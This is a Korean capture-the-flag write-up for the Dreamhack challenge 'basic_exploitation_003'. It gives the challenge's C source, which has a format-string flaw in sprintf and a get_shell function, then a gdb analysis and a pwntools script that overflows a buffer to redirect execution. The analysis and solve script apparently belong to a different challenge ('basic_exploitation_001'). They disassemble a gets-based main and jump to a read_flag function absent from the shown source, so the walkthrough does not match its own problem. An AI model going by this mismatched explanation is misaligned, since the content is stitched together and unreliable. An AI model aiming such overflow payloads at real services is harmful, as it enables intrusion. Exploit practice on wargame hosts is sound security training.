# 목차
1. 문제 설명

    1.1. Description

    1.2. Environment

2. 문제 파일 분석

    2.1. 코드 분석

    2.2. 실행 파일 분석

3. 문제 풀이 코드

## 1. 문제 설명

### 1.1. Description

이 문제는 서버에서 작동하고 있는 서비스(basic_exploitation_003)의 바이너리와 소스 코드가 주어집니다.

프로그램의 취약점을 찾고 익스플로잇해 "flag" 파일을 읽으세요.

"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.

플래그의 형식은 DH{...} 입니다.

### 1.2. Environment

Ubuntu 16.04

Arch:     i386-32-little

RELRO:    Partial RELRO

Stack:    No canary found

NX:       NX enabled

PIE:      No PIE (0x8048000)

## 2. 문제 파일 분석

### 2.1. 코드 분석

`cat basic_exploitation_003.c`를 통해 코드를 확인
```
// basic_exploitation_003.c //

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system("/bin/sh");
}
int main(int argc, char *argv[]) {
    char *heap_buf = (char *)malloc(0x80);
    char stack_buf[0x90] = {};
    initialize();
    read(0, heap_buf, 0x80);
    sprintf(stack_buf, heap_buf);
    printf("ECHO : %s\n", stack_buf);
    return 0;
}
```
- 주요 기능
    - `main`함수가 실행
    - 힙 메모리에 `heap_buf`에 `0x80(128)byte`의 공간을 부여
    - 스택 메모리에 `stack_buf`에 `0x90(144)byte`의 공간을 부여
    - `read`함수를 통해 `heap_buf`을 입력 받음
    - `sprintf`함수를 통해 `heap_buf`을 `stack_buf`에 저장
    - `get_shell`함수가 실행되면 `/bin/sh`을 실행

- 주의
    - `sprintf`함수가 `heap_buf`의 내용을 그대로 사용
    -  메모리 내용이 유출되거나, 메모리 값을 임의로 변경 가능
    - `gets`함수의 버퍼를 다 채울 경우 `null`이 들어갈 수 없어 오류 발생

- 발생 가능한 취약점
    - **포맷 스트링 취약점 (Format String Vulnerability)**
    - **스택 오버플로우(Stack Buffer OverFlow)**

즉, `sprintf`함수를 통해 `stack_buf`를 오버플로우를 시켜 스택에 있는 복귀 주소가 저장되어있는 `ret`에 `get_shell`함수의 주소를 넣는 **ROP(Retrun Oriented Programming)**가 발생 가능

### 2.2. 실행 파일 분석

`gdb ./basic_exploitation_001`를 통해 GNU 디버거를 실행

`disass main`를 통해 `main`함수의 어셈블리 확인
```
Dump of assembler code for function main:
   0x080485cc <+0>:     push   ebp
   0x080485cd <+1>:     mov    ebp,esp
   0x080485cf <+3>:     add    esp,0xffffff80
   0x080485d2 <+6>:     call   0x8048572 <initialize>
   0x080485d7 <+11>:    lea    eax,[ebp-0x80]
   0x080485da <+14>:    push   eax
   0x080485db <+15>:    call   0x80483d0 <gets@plt>
=> 0x080485e0 <+20>:    add    esp,0x4
   0x080485e3 <+23>:    mov    eax,0x0
   0x080485e8 <+28>:    leave
   0x080485e9 <+29>:    ret
```
`0x080485d7 <+11>:    lea    eax,[ebp-0x80]`: gets 함수의 시작주소를 저장

`0x080485db <+15>:    call   0x80483d0 <gets@plt>`: `0x80483d0` 주소에 저장된 `gets`함수를 실행

스택에 쌓인 모습
```
낮은 메모리 주소
+-----------------+ <-- buf 배열의 시작 주소 (ebp - 0x80)
|       buf       |
|    (128 byte)   |
+-----------------+
|       sfp       | <-- ebp (베이스 포인터)
|   (Saved EBP)   | <-- 이전 ebp의 값을 가짐
+-----------------+
|       ret       |
|  (Return addr)  | <-- gets 함수 호출 후 반환될 주소
+-----------------+
|       ...       |
+-----------------+ <-- esp (Stack Pointer: 스택 포인터)
높은 메모리 주소
```
`"x/i read_flag" or "disass read_flag"`등을 입력

`0x80485b9 <read_flag>:       push   ebp`

`ret`에 들어갈 `read_flag`함수의 주소 확인

## 3. 문제 풀이 코드

```
from pwn import *

payload = b'\x90'*128 + b'\x90'*4 + b'\xb9\x85\x04\x08' #buf + sfp + read_flag()

r = remote('host3.dreamhack.games', 12515)

r.send(payload)

r.interactive()
```
`\x90*128`: 버퍼에 아무 문자로 다 채움

`\x90*4`: sfp에 아무 문자로 다 채움

*32bit 환경에서는 sfp가 4byte의 크기*

*64bit 환경에서는 sfp가 8byte의 크기*

`\xb9\x85\x04\x08`: `ret`에 들어갈 `read_flag`함수의 주소를 리틀엔디안 방식으로 입력